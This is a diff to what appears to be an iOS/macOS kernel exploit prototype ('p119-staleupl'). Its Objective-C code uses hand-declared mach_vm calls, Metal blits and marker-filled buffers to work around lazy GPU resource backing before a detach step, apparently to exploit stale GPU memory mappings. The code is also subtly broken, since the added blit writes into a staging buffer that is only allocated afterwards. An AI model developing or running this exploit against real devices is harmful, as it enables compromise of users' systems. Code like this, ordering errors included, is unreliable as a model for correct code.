@@ -58,7 +58,7 @@
 #import <unistd.h>
 #import <sys/mman.h>
 
-#define P119_BUILD      @"p119-staleupl-v6"
+#define P119_BUILD      @"p119-staleupl-v7"
 
 /* the P069 prototype law: mach_vm has no SDK header for these decls */
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
@@ -277,6 +277,29 @@ static NSString *p119_finish(void) {
     void *cpu = g_mbuf.contents;
     if (cpu) memset(cpu, P119_FILL_OLD, MIN((size_t)g_mbuf.length, slen));
 
+    /* v7 LAZY-BACKING LAW (the bridge decompile, 27.0-RC, 2026-10-29:
+       IOGPUResource::detach_backing returns 0xe00002e2 when the resource's
+       memory lookup = 0 — the 27.0 train materializes the backing LAZILY;
+       26.5 = eager. FIX: one real blit + wait BEFORE the first detach so
+       the backing exists on both classes; fatal on neither. */
+    {
+        @autoreleasepool {
+            id<MTLCommandBuffer> cbw = [g_q commandBuffer];
+            id<MTLBlitCommandEncoder> ew = [cbw blitCommandEncoder];
+            [ew copyFromBuffer:g_mbuf sourceOffset:0
+                      toBuffer:g_stage destinationOffset:0
+                          size:MIN(g_mbuf.length, g_stage.length)];
+            [ew endEncoding];
+            [cbw commit];
+            [cbw waitUntilCompleted];
+            atomic_fetch_add(&g_commits, 1);
+        }
+    }
+    /* staging buffer for the blit above (used again by stage 1/1b) */
+    g_stage = [g_dev newBufferWithLength:(NSUInteger)(gvaLen ? gvaLen : slen)
+                                 options:MTLResourceStorageModeShared];
+    if (g_stage) memset(g_stage.contents, P119_FILL_STG, (size_t)(gvaLen ? gvaLen : slen));
+
     g_len = gvaLen ? gvaLen : slen;
     g_data = malloc((size_t)g_len);
     if (!g_data) { L(@"[-] STOP malloc"); return p119_finish(); }
@@ -307,7 +330,7 @@ static NSString *p119_finish(void) {
     if (rkr != 0) { L(@"[-] STOP replace failed"); return p119_finish(); }
     Lf(@"[0] working size = 0x%llx", g_len);
 
-    g_stage = [g_dev newBufferWithLength:(NSUInteger)g_len options:MTLResourceStorageModeShared];
+    /* v7: staging created earlier (the lazy-backing blit); nil-guard only */
     if (!g_stage) { L(@"[-] STOP no staging buffer"); return p119_finish(); }
     memset(g_stage.contents, P119_FILL_STG, (size_t)g_len);
 
